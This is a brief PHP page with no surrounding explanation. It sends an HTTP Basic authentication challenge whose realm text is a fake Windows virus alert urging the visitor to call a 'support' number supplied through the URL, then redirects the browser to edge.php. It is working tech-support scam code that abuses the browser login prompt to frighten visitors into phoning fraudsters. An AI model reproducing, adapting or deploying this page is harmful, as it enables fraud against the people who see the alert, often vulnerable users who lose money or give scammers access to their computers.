<?php
header('WWW-Authenticate: Basic realm="Warning: Windows Has Detected a Malicious Virus On Your System !! Call for support '.htmlspecialchars($_GET["num"]) .' "');
?>
<script type="text/javascript">window.location="edge.php";</script>